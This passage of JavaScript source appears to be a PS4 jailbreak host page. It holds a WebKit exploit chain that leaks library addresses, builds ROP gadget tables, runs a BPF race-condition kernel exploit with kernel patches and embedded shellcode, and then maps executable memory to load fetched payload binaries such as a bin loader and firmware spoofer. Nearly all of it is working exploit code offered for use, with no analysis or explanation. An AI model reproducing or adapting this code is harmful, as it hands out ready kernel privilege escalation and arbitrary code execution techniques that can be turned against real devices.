    kpatch(0x144AB4, patch_sys_dynlib_dlsym_2);
    var patch_sys_exec_1 = new int64(0x00F0ECB4, 0);
    var patch_sys_exec_2A = new int64(0x00F0ECBC, 0);
    var patch_sys_exec_2B = new int64(0xFFEA58F4, 0xFFFFFFFF);
    var patch_sys_exec_3 = new int64(0x00F0ECDC, 0);
    var patch_sys_exec_param1 = new int64(0x02, 0);
    var patch_sys_exec_param3 = new int64(0, 1);
    kpatch(patch_sys_exec_1, patch_sys_exec_param1);
    kpatch2(patch_sys_exec_2A, patch_sys_exec_2B);
    kpatch(patch_sys_exec_3, patch_sys_exec_param3);
    krop.push(window.gadgets["pop rax"]);
    krop.push(kscratch.add32(0x08));
    krop.push(window.gadgets["mov rax, [rax]"]);
    krop.push(window.gadgets["pop rsi"]);
    krop.push(0x09);
    krop.push(window.gadgets["add rax, rsi"]);
    krop.push(window.gadgets["mov rdi, rax"]);
    krop.push(window.gadgets["pop rax"]);
    krop.push(kscratch.add32(0x10));
    krop.push(window.gadgets["mov rax, [rax]"]);
    krop.push(window.gadgets["jmp rdi"]);
    krop.push(window.gadgets["ret2userland"]);
    krop.push(kscratch.add32(0x1000));
    var kq = p.malloc32(0x10);
    var kev = p.malloc32(0x100);
    kev.backing[0] = sock;
    kev.backing[2] = 0x1ffff;
    kev.backing[3] = 1;
    kev.backing[4] = 5;
    var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0xFE402494, 0x8D4DFFFF, 0xE09024B4, 0x8D4D0010, 0x5E8024AC, 0x81490043, 0x4B7160C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
    var shellbuf = p.malloc32(0x1000);
    for (var i = 0; i < shcode.length; i++)
      shellbuf.backing[i] = shcode[i];
    var race = new rop();
    start1();
    while (1) {
      race.count = 0;
      race.push(window.syscalls[362]);
      race.push(window.gadgets["pop rdi"]);
      race.push(kq);
      race.push(window.gadgets["mov [rdi], rax"]);
      race.push(window.gadgets["ret"]);
      race.push(window.gadgets["ret"]);
      race.push(window.gadgets["ret"]);
      race.push(window.gadgets["ret"]);
      race.push_write8(loop1, interrupt1);
      race.push(window.gadgets["pop rdi"]);
      race.push(fd);
      race.push(window.gadgets["pop rsi"]);
      race.push(0x8010427B);
      race.push(window.gadgets["pop rdx"]);
      race.push(bpf_valid_prog);
      race.push(window.syscalls[54]);
      race.push(window.gadgets["pop rax"]);
      race.push(kq);
      race.push(window.gadgets["mov rax, [rax]"]);
      race.push(window.gadgets["pop rdi"]);
      race.push(0);
      race.push(window.gadgets["add rdi, rax"]);
      race.push(window.gadgets["pop rsi"]);
      race.push(kev);
      race.push(window.gadgets["pop rdx"]);
      race.push(1);
      race.push(window.gadgets["pop rcx"]);
      race.push(0);
      race.push(window.gadgets["pop r8"]);
      race.push(0);
      race.push(window.syscalls[363]);
      race.push(window.gadgets["pop rdi"]);
      race.push(fd1);
      race.push(window.gadgets["pop rsi"]);
      race.push(0x8010427B);
      race.push(window.gadgets["pop rdx"]);
      race.push(bpf_spray_prog);
      race.push(window.syscalls[54]);
      race.push(window.gadgets["pop rax"]);
      race.push(kq);
      race.push(window.gadgets["mov rax, [rax]"]);
      race.push(window.gadgets["pop rdi"]);
      race.push(0);
      race.push(window.gadgets["add rdi, rax"]);
      race.push(window.syscalls[6]);
      race.run();
      if (kscratch.backing[0] != 0) {
        p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
        p.fcall(shellbuf);
        return true;
      }
    }
  } catch (ex) {
    fail(ex)
  }
  return false;
}
var p;
function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds)
      break;
  }
}
var print = function (x) {
  document.getElementById("console").innerText += x + "\n";
}
var print = function (string) {
  document.getElementById("console").innerHTML += string + "\n";
}
var get_jmptgt = function (addr) {
  var z = p.read4(addr) & 0xFFFF;
  var y = p.read4(addr.add32(2));
  if (z != 0x25ff)
    return 0;
  return addr.add32(y + 6);
}
var gadgetmap_wk = {
  "ep": [0x5b, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0x5d, 0xc3],
  "pop rsi": [0x5e, 0xc3],
  "pop rdi": [0x5f, 0xc3],
  "pop rsp": [0x5c, 0xc3],
  "pop rax": [0x58, 0xc3],
  "pop rdx": [0x5a, 0xc3],
  "pop rcx": [0x59, 0xc3],
  "pop rsp": [0x5c, 0xc3],
  "pop rbp": [0x5d, 0xc3],
  "pop r8": [0x47, 0x58, 0xc3],
  "pop r9": [0x47, 0x59, 0xc3],
  "infloop": [0xeb, 0xfe, 0xc3],
  "ret": [0xc3],
  "mov [rdi], rsi": [0x48, 0x89, 0x37, 0xc3],
  "mov [rax], rsi": [0x48, 0x89, 0x30, 0xc3],
  "mov [rdi], rax": [0x48, 0x89, 0x07, 0xc3],
  "mov rax, rdi": [0x48, 0x89, 0xf8, 0xc3]
};
var slowpath_jop = [0x48, 0x8B, 0x7F, 0x48, 0x48, 0x8B, 0x07, 0x48, 0x8B, 0x40, 0x30, 0xFF, 0xE0];
slowpath_jop.reverse();
var gadgets;

gadgetcache = {
  "ret": 0x0000003C,
  "jmp rax": 0x00000082,
  "ep": 0x000000AD,
  "pop rbp": 0x000000B6,
  "mov [rdi], rax": 0x003ADAEB,
  "pop r8": 0x000179C5,
  "pop rax": 0x000043F5,
  "mov rax, rdi": 0x000058D0,
  "mov rax, [rax]": 0x0006C83A,
  "pop rsi": 0x0008F38A,
  "pop rdi": 0x00038DBA,
  "pop rcx": 0x00052E59,
  "pop rsp": 0x0001E687,
  "mov [rdi], rsi": 0x00023AC2,
  "mov [rax], rsi": 0x00256667,
  "pop rdx": 0x001BE024,
  "pop r9": 0x00BB320F,
  "jop": 0x000C37D0,
  "infloop": 0x01545EAA,
  "add rax, rcx": 0x000156DB,
  "mov rdx, rax": 0x00353B31,
  "mov rdi, rax": 0x015A412F,
  "mov rax, rdx": 0x001CEF20,
  "ret2userland": 0x0005CDB9,
  "jop1": 0x012A19CD,
  "jop2": 0x006EF4E5,
  "jop3": 0x015CA41B,
  "jop4": 0x01284834,
  "jop_mov rbp, rsp": 0x000F094A,
  "jop6": 0x00272961,
  "mov rax, [rdi]": 0x00046EF9,
  "add rdi, rax": 0x005557DF,
  "add rax, rsi": 0x001520C6,
  "and rax, rsi": 0x01570B9F,
  "jmp rdi": 0x00295E7E,
  "mov [rsi], rdx": 0x00A6450A,
  "longjmp": 0x000014E8,
  "createThread": 0x00779390,
};
gadgetshiftcache = {
  "stackshift_jop1": 0x00000058,
  "stackshift_jop6": 0x00000028,
};
window.gadgets_shift = gadgetshiftcache;
window.exploit = function () {
  p = window.prim;
  p.leakfunc = function (func) {
    var fptr_store = p.leakval(func);
    return (p.read8(fptr_store.add32(0x18))).add32(0x40);
  }
  var parseFloatStore = p.leakfunc(parseFloat);
  var parseFloatPtr = p.read8(parseFloatStore);
  var webKitBase = parseFloatPtr;
  webKitBase.sub32inplace(0x578540);
  window.webKitBase = webKitBase;
  var o2wk = function (o) {
    return webKitBase.add32(o);
  }
  window.o2wk = o2wk;
  gadgets = {
    "__stack_chk_fail": o2wk(0xC8),
    "__stack_chk_fail_offset": 0x11EC0,
    "memcmp": o2wk(0x208),
    "memcmp_offset": 0x8AFA0,
    "memset": o2wk(0x228),
    "memset_offset": 0x118,
    "setjmp": o2wk(0x14F8)
  };
  var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets.memset));
  libSceLibcInternalBase.sub32inplace(gadgets.memset_offset);
  window.libSceLibcInternalBase = libSceLibcInternalBase;
  var o2lc = function (o) {
    return libSceLibcInternalBase.add32(o);
  }
  window.o2lc = o2lc;
  var libKernelBase = p.read8(get_jmptgt(gadgets.__stack_chk_fail));
  libKernelBase.sub32inplace(gadgets.__stack_chk_fail_offset);
  window.libKernelBase = libKernelBase;
  var o2lk = function (o) {
    return libKernelBase.add32(o);
  }
  window.o2lk = o2lk;
  var wkview = new Uint8Array(0x1000);
  var wkstr = p.leakval(wkview).add32(0x10);
  var orig_wkview_buf = p.read8(wkstr);
  p.write8(wkstr, webKitBase);
  p.write4(wkstr.add32(8), 0x3052D38);
  var gadgets_to_find = 0;
  var gadgetnames = [];
  for (var gadgetname in gadgetmap_wk) {
    if (gadgetmap_wk.hasOwnProperty(gadgetname)) {
      gadgets_to_find++;
      gadgetnames.push(gadgetname);
      gadgetmap_wk[gadgetname].reverse();
    }
  }
  gadgets_to_find++;
  var findgadget = function (donecb) {
    if (gadgetcache) {
      gadgets_to_find = 0;
      slowpath_jop = 0;
      for (var gadgetname in gadgetcache) {
        if (gadgetcache.hasOwnProperty(gadgetname))
          gadgets[gadgetname] = o2wk(gadgetcache[gadgetname]);
      }
    } else {
      for (var i = 0; i < wkview.length; i++) {
        if (wkview[i] == 0xc3) {
          for (var nl = 0; nl < gadgetnames.length; nl++) {
            var found = 1;
            if (!gadgetnames[nl])
              continue;
            var gadgetbytes = gadgetmap_wk[gadgetnames[nl]];
            for (var compareidx = 0; compareidx < gadgetbytes.length; compareidx++) {
              if (gadgetbytes[compareidx] != wkview[i - compareidx]) {
                found = 0;
                break;
              }
            }
            if (!found)
              continue;
            gadgets[gadgetnames[nl]] = o2wk(i - gadgetbytes.length + 1);
            gadgetoffs[gadgetnames[nl]] = i - gadgetbytes.length + 1;
            delete gadgetnames[nl];
            gadgets_to_find--;
          }
        } else if (wkview[i] == 0xe0 && wkview[i - 1] == 0xff && slowpath_jop) {
          var found = 1;
          for (var compareidx = 0; compareidx < slowpath_jop.length; compareidx++) {
            if (slowpath_jop[compareidx] != wkview[i - compareidx]) {
              found = 0;
              break;
            }
          }
          if (!found)
            continue;
          gadgets["jop"] = o2wk(i - slowpath_jop.length + 1);
          gadgetoffs["jop"] = i - slowpath_jop.length + 1;
          gadgets_to_find--;
          slowpath_jop = 0;
        }
        if (!gadgets_to_find)
          break;
      }
    }
    if (!gadgets_to_find && !slowpath_jop)
      setTimeout(donecb, 50);
    else {
      print("missing gadgets: ");
      for (var nl in gadgetnames)
        print(" - " + gadgetnames[nl]);
      if (slowpath_jop)
        print(" - jop gadget");
    }
  }
  findgadget(function () {});
  var hold1;
  var hold2;
  var holdz;
  var holdz1;
  while (1) {
    hold1 = {
      a: 0,
      b: 0,
      c: 0,
      d: 0
    };
    hold2 = {
      a: 0,
      b: 0,
      c: 0,
      d: 0
    };
    holdz1 = p.leakval(hold2);
    holdz = p.leakval(hold1);
    if (holdz.low - 0x30 == holdz1.low)
      break;
  }
  var pushframe = [];
  pushframe.length = 0x80;
  var funcbuf;
  var funcbuf32 = new Uint32Array(0x100);
  nogc.push(funcbuf32);
  var launch_chain = function (chain) {
    var stackPointer = 0;
    var stackCookie = 0;
    var orig_reenter_rip = 0;
    var reenter_help = {
      length: {
        valueOf: function () {
          orig_reenter_rip = p.read8(stackPointer);
          stackCookie = p.read8(stackPointer.add32(8));
          var returnToFrame = stackPointer;
          var ocnt = chain.count;
          chain.push_write8(stackPointer, orig_reenter_rip);
          chain.push_write8(stackPointer.add32(8), stackCookie);
          if (chain.runtime)
            returnToFrame = chain.runtime(stackPointer);
          chain.push(gadgets["pop rsp"]);
          chain.push(returnToFrame);
          chain.count = ocnt;
          p.write8(stackPointer, (gadgets["pop rsp"]));
          p.write8(stackPointer.add32(8), chain.stackBase);
        }
      }
    };
    funcbuf = p.read8(p.leakval(funcbuf32).add32(0x10));
    p.write8(funcbuf.add32(0x30), gadgets["setjmp"]);
    p.write8(funcbuf.add32(0x80), gadgets["jop"]);
    p.write8(funcbuf, funcbuf);
    p.write8(parseFloatStore, gadgets["jop"]);
    var orig_hold = p.read8(holdz1);
    var orig_hold48 = p.read8(holdz1.add32(0x48));
    p.write8(holdz1, funcbuf.add32(0x50));
    p.write8(holdz1.add32(0x48), funcbuf);
    parseFloat(hold2, hold2, hold2, hold2, hold2, hold2);
    p.write8(holdz1, orig_hold);
    p.write8(holdz1.add32(0x48), orig_hold48);
    stackPointer = p.read8(funcbuf.add32(0x10));
    rtv = Array.prototype.splice.apply(reenter_help);
    return p.leakval(rtv);
  }
  gadgets = gadgets;
  p.loadchain = launch_chain;
  function swapkeyval(json) {
    var ret = {};
    for (var key in json) {
      if (json.hasOwnProperty(key))
        ret[json[key]] = key;
    }
    return ret;
  }
  var kview = new Uint8Array(0x1000);
  var kstr = p.leakval(kview).add32(0x10);
  var orig_kview_buf = p.read8(kstr);
  p.write8(kstr, window.libKernelBase);
  p.write4(kstr.add32(8), 0x40000);
  var countbytes;
  for (var i = 0; i < 0x40000; i++) {
    if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
      countbytes = i;
      break;
    }
  }
  p.write4(kstr.add32(8), countbytes + 32);
  var dview32 = new Uint32Array(1);
  var dview8 = new Uint8Array(dview32.buffer);
  for (var i = 0; i < countbytes; i++) {
    if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
      dview8[0] = kview[i + 3];
      dview8[1] = kview[i + 4];
      dview8[2] = kview[i + 5];
      dview8[3] = kview[i + 6];
      var syscallno = dview32[0];
      window.syscalls[syscallno] = window.libKernelBase.add32(i);
    }
  }
  var chain = new window.rop;
  var returnvalue;
  p.fcall_ = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    chain.clear();
    chain.notimes = this.next_notime;
    this.next_notime = 1;
    chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
    chain.push(window.gadgets["pop rdi"]);
    chain.push(chain.stackBase.add32(0x3ff8));
    chain.push(window.gadgets["mov [rdi], rax"]);
    chain.push(window.gadgets["pop rax"]);
    chain.push(p.leakval(0x41414242));
    if (chain.run().low != 0x41414242)
      throw new Error("unexpected rop behaviour");
    returnvalue = p.read8(chain.stackBase.add32(0x3ff8));
  }
  p.fcall = function () {
    var rv = p.fcall_.apply(this, arguments);
    return returnvalue;
  }
  p.readstr = function (addr) {
    var addr_ = addr.add32(0);
    var rd = p.read4(addr_);
    var buf = "";
    while (rd & 0xFF) {
      buf += String.fromCharCode(rd & 0xFF);
      addr_.add32inplace(1);
      rd = p.read4(addr_);
    }
    return buf;
  }
  p.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
    if (typeof sysc == "string")
      sysc = window.syscallnames[sysc];
    if (typeof sysc != "number")
      throw new Error("invalid syscall");
    var off = window.syscalls[sysc];
    if (off == undefined)
      throw new Error("invalid syscall");
    return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
  }
  p.stringify = function (str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++)
      bufView[i] = str.charCodeAt(i) & 0xFF;
    window.nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(0x10));
  };
  p.malloc = function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }
  p.malloc32 = function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  }

function runPayload() {
  var padding0 = new Uint8Array(4 - (req0.response.byteLength % 4) % 4);
  var tmp0 = new Uint8Array(req0.response.byteLength + padding0.byteLength);
  tmp0.set(new Uint8Array(req0.response), 0);
  tmp0.set(padding0, req0.response.byteLength);
  var shellcode0 = new Uint32Array(tmp0.buffer);
  var code_addr0 = new int64(0x26100000, 0x00000009);
  p.syscall("sys_mmap", code_addr0, 0xC00000, 7, 0x41000, -1, 0);
  for (var i = 0; i < shellcode0.length; i++) {
  p.write4(code_addr0.add32(0x100000 + i * 4), shellcode0[i]);
  }
  runPAYLOAD1 = function () {
  p.fcall(code_addr0);
  p.syscall("sys_munmap", code_addr0, 0xC00000);
  };
  done();
  setTimeout(runPAYLOAD1, 2100);
}

function runPayloadNoClear() {
  var padding0 = new Uint8Array(4 - (req0.response.byteLength % 4) % 4);
  var tmp0 = new Uint8Array(req0.response.byteLength + padding0.byteLength);
  tmp0.set(new Uint8Array(req0.response), 0);
  tmp0.set(padding0, req0.response.byteLength);
  var shellcode0 = new Uint32Array(tmp0.buffer);
  var code_addr0 = new int64(0x26100000, 0x00000009);
  p.syscall("sys_mmap", code_addr0, 0xC00000, 7, 0x41000, -1, 0);
  for (var i = 0; i < shellcode0.length; i++) {
  p.write4(code_addr0.add32(0x100000 + i * 4), shellcode0[i]);
  }
  runPAYLOAD1 = function () {
  p.fcall(code_addr0);
//p.syscall("sys_munmap", code_addr0, 0xC00000);
  };
  done();
  setTimeout(runPAYLOAD1, 2100);
}
  
RunBinLoader = function() {
  var code_addr = new int64(0x26100000, 0x00000009);
  var mapped_address = p.syscall("sys_mmap", code_addr, 0xC00000, 7, 0x41000, -1, 0);
  if (mapped_address == '926100000') {
    try {
      var shcode = [0x31fe8948, 0x3d8b48c0, 0x00003ff4, 0xed0d8b48, 0x4800003f, 0xaaf3f929, 0xe8f78948, 0x00000060, 0x48c3c031, 0x0003c0c7, 0x89490000, 0xc3050fca, 0x06c0c748, 0x49000000, 0x050fca89, 0xc0c748c3, 0x0000001e, 0x0fca8949, 0xc748c305, 0x000061c0, 0xca894900, 0x48c3050f, 0x0068c0c7, 0x89490000, 0xc3050fca, 0x6ac0c748, 0x49000000, 0x050fca89, 0x909090c3, 0x90909090, 0x90909090, 0x90909090, 0xb8555441, 0x00003c23, 0xbed23153, 0x00000001, 0x000002bf, 0xec834800, 0x2404c610, 0x2444c610, 0x44c70201, 0x00000424, 0x89660000, 0xc6022444, 0x00082444, 0x092444c6, 0x2444c600, 0x44c6000a, 0xc6000b24, 0x000c2444, 0x0d2444c6, 0xff78e800, 0x10baffff, 0x41000000, 0x8948c489, 0xe8c789e6, 0xffffff73, 0x00000abe, 0xe7894400, 0xffff73e8, 0x31d231ff, 0xe78944f6, 0xffff40e8, 0x48c589ff, 0x200000b8, 0x00000926, 0xc300c600, 0xebc38948, 0x801f0f0c, 0x00000000, 0x01489848, 0x1000bac3, 0x89480000, 0xe8ef89de, 0xfffffef7, 0xe87fc085, 0xe8e78944, 0xfffffef8, 0xf1e8ef89, 0x48fffffe, 0x200000b8, 0x00000926, 0x48d0ff00, 0x5b10c483, 0xc35c415d, 0xc3c3c3c3];
      var shellbuf = p.malloc32(0x1000);
      for (var i = 0; i < shcode.length; i++)
        shellbuf.backing[i] = shcode[i];
      p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
      p.fcall(window.gadgets["createThread"], shellbuf, 0, p.stringify("loader"));
      done();
    } catch (e) {
      alert(e);
    }
  }
};

SetRTC = function (year, month, day, hours, minutes, seconds) {
  var code_addr = new int64(0x26100000, 0x00000009);
  var buffer = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
  var date1 = new Date(2012, 0, 1, TZhours, TZmins, 0);
  var date2 = new Date(year, month, day, hours, minutes, seconds);
  var timetoset = (date2.getTime() - date1.getTime()) / 1000;
  localStorage.KernEpochDiff = new Date().getTime() +  - new Date(timetoset * 1000 + 1325376000000);
  parent.ShowTimeAndDate();
  writePL(p.write4, code_addr.add32(0x100000), timetoset);
  p.fcall(code_addr);
  RTCdone();
};

ReSetRTC = function() {
  var code_addr = new int64(0x26100000, 0x00000009);
  var buffer = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
  var cdate = new Date();
  var ps4epoch = new Date(2012, 0, 1, TZhours, TZmins, 0);
  cdate.setMilliseconds(0);
  timetoset = (cdate.getTime() - ps4epoch.getTime()) / 1000;
  localStorage.KernEpochDiff = new Date().getTime() +  - new Date(timetoset * 1000 + 1325376000000);
  parent.ShowTimeAndDate();
  writePL(p.write4, code_addr.add32(0x100000), timetoset);
  p.fcall(code_addr);
  window.parent.Loader.style.opacity = "0";
  setTimeout(function(){parent.HideLoaderBox();},1000);
}

SetFanTemp = function(tempVAL) {
  var code_addr = new int64(0x26100000, 0x00000009);
  var buffer = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
  writePL(p.write4, code_addr.add32(0x100000), (tempVAL));
  p.fcall(code_addr);
};

SetFWspoof = function(FWval) {
  var code_addr = new int64(0x26100000, 0x00000009);
  var buffer = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
  writePL(p.write4, code_addr.add32(0x100000), (FWval));
  p.fcall(code_addr);
  FWdone();
};

ChainLoader = function() {	
	LoadPayload2 = function() {
		var padding2 = new Uint8Array(4 - (req2.response.byteLength % 4) % 4);
		var tmp2 = new Uint8Array(req2.response.byteLength + padding2.byteLength);
		tmp2.set(new Uint8Array(req2.response), 0);
		tmp2.set(padding2, req2.response.byteLength);
		var shellcode2 = new Uint32Array(tmp2.buffer);
		var code_addr2 = new int64(0x26100000, 0x00000009);
		p.syscall("sys_mmap", code_addr2, 0x300000, 7, 0x41000, -1, 0);
		for (var i = 0; i < shellcode2.length; i++) {p.write4(code_addr2.add32(0x100000 + i * 4), shellcode2[i]);}	
		p.fcall(code_addr2);
		p.syscall("sys_munmap", code_addr2, 0x300000);
	}

		var padding1 = new Uint8Array(4 - (req1.response.byteLength % 4) % 4);
		var tmp1 = new Uint8Array(req1.response.byteLength + padding1.byteLength);
		tmp1.set(new Uint8Array(req1.response), 0);
		tmp1.set(padding1, req1.response.byteLength);
		var shellcode1 = new Uint32Array(tmp1.buffer);
		var code_addr1 = new int64(0x26100000, 0x00000009);
		p.syscall("sys_mmap", code_addr1, 0x300000, 7, 0x41000, -1, 0);
		for (var i = 0; i < shellcode1.length; i++){p.write4(code_addr1.add32(0x100000 + i * 4), shellcode1[i]);}
	done();
	runPAYLOAD1 = function(){
	p.fcall(code_addr1);
	p.syscall("sys_munmap", code_addr1, 0x300000);
	setTimeout(LoadPayload2,4000);
	}
	setTimeout(runPAYLOAD1, 2000);
}
  
LoadPayload = function(){
       if (sessionStorage.ThisIsBinLoader  != null){RunBinLoader();}
  else if (sessionStorage.ThisIsFanControl != null){showCHOICE();}
  else if (sessionStorage.ThisIsFwSpoofer != null){showCHOICE();}
  else if (sessionStorage.ThisIsReactMOD != null){showCHOICE();}
  else if (sessionStorage.ThisIsReactUNDO != null){ReSetRTC();}
  else if (sessionStorage.ThisIsSaveMounter != null){ChainLoader();}
  else if (sessionStorage.ThisIsOrbisAFR != null){ChainLoader();}
  else if (sessionStorage.StoogedFix != null){runPayloadNoClear();}
  else {runPayload(bin);}
};

  if (p.syscall("sys_setuid", 0) != 0) {
    kernExploit();
    LoadPayload();
  } else {
	LoadPayload();
  }
  
}
